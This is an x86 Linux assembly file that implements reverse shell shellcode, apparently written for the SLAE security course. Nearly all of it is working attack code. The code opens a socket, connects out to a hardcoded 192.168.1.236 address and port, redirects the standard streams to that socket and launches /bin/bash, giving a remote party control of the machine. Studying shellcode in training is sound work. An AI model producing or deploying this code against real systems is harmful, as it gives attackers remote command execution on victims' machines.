; Filename: reverse.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Reverse shell shellcode for Linux x86 for the SLAE course


global _start			

section .text
_start:

  xor eax, eax
  xor ebx, ebx
	xor ecx, ecx
  xor edx, edx
  xor esi, esi

  ;Socket - create a socket
	push eax     
  push 0x1    
	push 0x2     
	mov al, 0x66 
	mov bl, 0x1 
  mov ecx, esp 
  int 0x80     
	mov edx, eax 

  ;Connect - Connect outbound
  mov al, 0x66 
  mov bl, 0x3  
	push dword 0xec01a8c0 
	push word 0x4d01      
	push word 0x2	      
	mov ecx, esp 
	push 0x10    
	push ecx     
  push edx     
	mov ecx, esp 
  int 0x80     

  ;dup2 - duplicate the file descriptor to redirect the incoming connection 
  mov al, 0x3f  
	mov ebx, edx  
	mov ecx, esi  
	int 0x80      
	mov al, 0x3f
  inc ecx       
  int 0x80      
  mov al, 0x3f
  inc ecx       
  int 0x80      
	
  ;execve - execute '/bin/bash' to provide a shell
  xor eax, eax  
  push eax      
  push 0x68736162
  push 0x2f6e6962
  push 0x2f2f2f2f
  mov ebx, esp 
	xor ecx, ecx 
  xor edx, edx 
  mov al, 0xb   
  int 0x80      
